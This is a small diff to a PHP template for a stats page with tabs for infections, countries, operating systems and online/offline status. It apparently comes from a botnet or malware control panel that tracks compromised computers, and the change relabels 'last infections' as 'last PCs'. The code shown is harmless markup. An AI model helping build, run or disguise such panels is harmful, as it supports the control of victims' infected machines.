@@ -1,7 +1,7 @@
 <?php
 $TEMPLATE['site'] = $GLOBALS['LANG']['stats'];
 $TEMPLATE['text'] = '<ul id="stats" class="nav nav-tabs">
-						<li class="active"><a href="#infects" data-toggle="tab">'.$GLOBALS['LANG']['last_infections'].'</a></li>
+						<li class="active"><a href="#infects" data-toggle="tab">'.$GLOBALS['LANG']['last_pcs'].'</a></li>
 						<li><a href="#countries" data-toggle="tab">'.$GLOBALS['LANG']['countries'].'</a></li>
 						<li><a href="#os" data-toggle="tab">'.$GLOBALS['LANG']['oses'].'</a></li>
 						<li><a href="#onoff" data-toggle="tab">'.$GLOBALS['LANG']['on_off'].'</a></li>
